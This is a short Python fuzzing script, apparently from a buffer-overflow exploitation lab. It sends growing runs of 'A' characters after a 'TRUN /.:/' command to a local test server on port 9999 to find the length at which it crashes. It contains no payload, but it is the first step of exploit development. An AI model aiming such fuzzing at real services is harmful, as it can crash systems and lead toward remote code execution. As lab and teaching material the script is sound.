# Basic python Fuzzer for buffer overflow testing
#
import socket
import sys

buffer = ["A"]
counter = 100

while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter = counter + 200

for string in buffer:
    print(f"Fuzzing the server with '{len(string)}' bytes of data...")
    dest = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = dest.connect(("127.0.0.1", 9999))
    data = "TRUN /.:/" + string
    #dest.send(bytes("TRUN /.:/" + string))
    dest.send(data.encode())
    dest.close()
#